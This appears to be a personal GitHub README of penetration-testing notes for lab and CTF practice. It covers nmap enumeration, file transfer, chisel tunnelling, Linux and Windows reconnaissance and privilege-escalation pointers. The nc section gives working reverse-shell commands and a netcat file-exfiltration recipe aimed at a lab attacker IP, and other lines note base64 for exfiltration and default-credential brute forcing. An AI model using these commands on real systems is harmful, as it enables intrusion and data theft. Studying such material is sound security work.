# PT𓀮EH

**Notes about Penetration Testing and Ethical Hackin.**

*[Image: crosshair]*

---

[REED](https://github.com/bmedicke/REED) | PTEH

---

# toc

<!-- vim-markdown-toc GFM -->

* [the pentest process](#the-pentest-process)
	* [pre-engagement interactions](#pre-engagement-interactions)
	* [information gathering](#information-gathering)
	* [threat modeling](#threat-modeling)
	* [vulnerability analysis](#vulnerability-analysis)
	* [exploitation](#exploitation)
	* [post-exploitation](#post-exploitation)
	* [reporting](#reporting)
* [CTF and wargame writeups](#ctf-and-wargame-writeups)
* [Web Application Security](#web-application-security)
* [enumeration](#enumeration)
	* [webapps](#webapps)
* [foothold and pivot](#foothold-and-pivot)
	* [kali](#kali)
	* [linux](#linux)
	* [windows](#windows)
* [privilege escalation](#privilege-escalation)
	* [linux](#linux-1)
	* [windows](#windows-1)
* [bonus](#bonus)
	* [oneliners](#oneliners)
	* [kali config](#kali-config)
	* [kali tips](#kali-tips)
	* [basics](#basics)
		* [windows](#windows-2)
		* [linux](#linux-2)
* [tools](#tools)
	* [find](#find)
	* [less](#less)
	* [nc](#nc)
	* [openssl](#openssl)
	* [socat and ncat](#socat-and-ncat)
	* [ssh](#ssh)
	* [Burp Suite](#burp-suite)
	* [sqlmap](#sqlmap)
	* [thc-hydra](#thc-hydra)

<!-- vim-markdown-toc -->

# the pentest process

This section follows the structure of the [Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page) (PTES):

## pre-engagement interactions

## information gathering

## threat modeling

## vulnerability analysis

## exploitation

## post-exploitation

## reporting

Documentation should start as soon as the pentenst starts to avoid situations
where you need additional information but have already lost access to the target.

Creating a mindmap is a good idea to get a clear but complete picture.

* useful tools:
  * [Freemind](http://freemind.sourceforge.net/) allows for attaching files, such as port scans, to nodes

# CTF and wargame writeups

* https://overthewire.org/ (linux)
  * **[overthewire writeups](writeups/overthewire)** (in repo link)
* https://underthewire.tech/ (powershell)
* https://hackthebox.eu/
  * **[hackthebox writeups](writeups/hackthebox)** (in repo link)
* https://www.hacker101.com/
* https://microcorruption.com/
* http://smashthestack.org/
* https://exploit-exercises.lains.space/ (mirror, original is down)

# Web Application Security

* **[webapp](webapp)** (in repo link)

# enumeration

> port scanning

```sh
nmap -v $host | tee 00.nmap # fast initial scan.
nmap -A -v -sS -oA 01 -T4 $host
nmap -A -v -sS -oA 02 -p- $host
```

> finding exploits

* google
* https://www.rapid7.com/db/
* https://exploit-db.com

```sh
# CLI utility for https://exploit-db.com  database:
searchsploit motd # search exploits for message of the day.
searchsploit -x 1235.c # look at specific exploit.
```

## webapps

* if it's a webapp/CMS/etc.:
  * `dirb` it
  * check out `robots.txt`
  * try admin:admin credentials
  * try default credentials
    * `hydra`
  * look for a copyright date in the header/footer
    * usually not automatically generated
  * try some vhosts by modifying the header with [Burp Suite](#burp-suite)

# foothold and pivot

## kali

* don't forget about:
  * `/usr/share/webshells`
  * `/usr/share/windows-resources`
  * `/usr/share/wordlists`

> serving files

```sh
# via webserver:
python3 -m http.server 80

# via samba:
impacket-smbserver -smb2server share .
```

> reverse shells and port bindings

```sh
# netcat
rlwrap nc -lnvp 42424

# chisel
# start the client first:
chisel client -v 10.10.14.69 R:8888:127.0.0.1:8888
# local: 8888
# remote: 127.0.0.1:8888
chisel server -v -p 12345 --reverse
# connect with:

# plink
```

## linux

> information gathering

```sh
uname -a # os info.
id # user and groups.
ps -p $$ # name of current process.
ip a # or ifconfig.
netstat -tulpen # connections.
lsblk # devices.
locate / # list of probably every file on the system.
# depending on under which user updatedb ran.

find / -perm -4000 2>/dev/null # setuid executables.
# if any of these have an exploit they can be used
# to elevate privileges to root.

# pretty print of home files:
find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t | tee files
dpkg -l # list of installed packages (and versions)
```

> downloading files

* on Linux you should save your files to `/dev/shm` (the ramdisk)
  * type `mount | grep shm` to see that it is a tmpfs filesystem
  * it gets wiped on unmount (you could clean up with `umount /dev/shm`)
  * other choices:
    * `/tmp` gets wiped on reboot (might be tmpfs)
    * `/var/tmp` persists between reboots (not tmpfs)

```sh
# linux download:
wget $h/file
curl $h/file -so file
```

> info gathering with external tools

```sh
./linpeas.sh -a
```

## windows

> information gathering

```sh
dir /q
whoami /all
systeminfo
set
tasklist
ipconfig /all
netstat -nao | findstr 127 | findstr LISTEN

# services
powershell -c "Get-Service | Format-Table -AutoSize"
sc # stop/start service
net start # old (from DOS)
```

> downloading files

```sh
# powershell:
iwr hostname/file.exe -outf file.exe
# long version:
Invoke-WebRequest hostname/file.exe -OutFile file.exe
```

> info gathering with external tools

```sh
linpeas.exe
linpeas.bat # if exe fails.
```

# privilege escalation

## linux

* Kernel 2.6.22 to 4.8.3 Dirty Cow (`dirty.c`)

## windows

# bonus
## oneliners

```sh
# upgrade shell:
python -c 'import pty;pty.spawn("bash")'

# fix environment:
export TERM=linux

# logging a reverse shell locally:
script # stop with ^D. breaks in vi. finicky.

# get a temp dir:
cd $(mktemp -d)

# get local connections:
netstat -tulpen
```

## kali config

```sh
# pip2 for new Kalis:
curl -s https://bootstrap.pypa.io/get-pip.py | python2
pip2 install requests colorama # for the exploit above.
pip2 install xlrd # for windows exploit suggester.
apt install ncdu

pip3 install cve_searchsploit # https://github.com/andreafioraldi/cve_searchsploit
# update it:
cve_searchsploit -u

cd /opt
git clone 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git'
cd Windows-Exploit-Suggester
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --help

# chisel
cd /opt
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_windows_386.gz'
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_linux_386.gz'
gunzip chisel*
mv chisel*windows* chisel.exe
```

```sh
# metasploit
sudo service postgresql start
sudo msfdb init
msfconsole # db_status
```

## kali tips

* ranger disables previews for root (enable them on a by case basis with `zp`)

## basics
### windows

```sh
# windows get cmd.exe help:
help

# powershell
cd $env:tmp

# cmd.exe
cd %tmp%
```

### linux

```sh
umask -S # file creation mask.
# help umask (linux)

sudo -l # list allowed and forbidden commands.

sudo -u kali whoami # run whoami as kali.

base64 # great for exfiltration without inet.
# then just copy the text from the terminal.
# -d to decode it again.
# use pipes or pass a filename.

strings -e # different encoding options.

find . # get list of all files in dir.
# great for lot's of files/folders with spaces
# where autocompletion is broken.

xdotool # fake keyboard mouse in X.
```

# tools

## find

```sh
# look for binaries with SUID:
find / -perm -4000 2>/dev/null
```

## less

> read raw control chars (colors).
```sh
./linpeas.sh | less -R
```

* less uses many vim bindings
* press `h` for help
* press `s` to save to a file
* `Gg` scrolls to the bottom and back up, now you can use `^g` to show progress!

## nc

> reverse shell
```sh
# attacker:
nc -lnvp 12345

# attackee:
nc -e /bin/bash 10.10.14.69 12345 # most nix.
nc -e cmd.exe 10.10.14.69 12345 # windows.
```

> exfiltration by piping over the network
```sh
# attacker:
nc -lnvp 12345 > exfil_file

# attackee:
nc -q0 10.10.14.69 12345 < exfil_file

# on both:
md5sum exfil_file # and compare hashes to verify the transfer.
```

* commands this can be useful for: `dd`, `tar` (tar pipe)

> check for open port
```sh
nc -vvz localhost 443

# multiple
nc -vzz localhost 80 8080

# or a range
nc -vvz localhost 1-1024 2>&1 | grep -v refused
```

## openssl

* [man pages](https://www.openssl.org/docs/manmaster/man1/)
  * `man openssl`
  * `-help` flag for subcommands
* for SSL connections:
  * `s_client` and `s_server` subcommands
    * `openssl s_client -connect localhost:443`
    * `openssl s_server`
* for hashing:
  * `echo hello | openssl sha1`
  * `openssl md5 test_file`
* for encoding:
  * `openssl base64 -in test_file`
* for encryption:
  * `openssl chacha20`
  * `openssl aes256`

## socat and ncat

* for encrypted shells/exfiltration

## ssh

> local port forwarding

```sh
ssh -N kali -L 0.0.0.0:8080:tabby:8080 -L 0.0.0.0:80:tabby:80
# binds tabby's 80 and 8080 to all interfaces on the executing server.
```

## Burp Suite

* [Burp Suite](burp)

## sqlmap

## thc-hydra
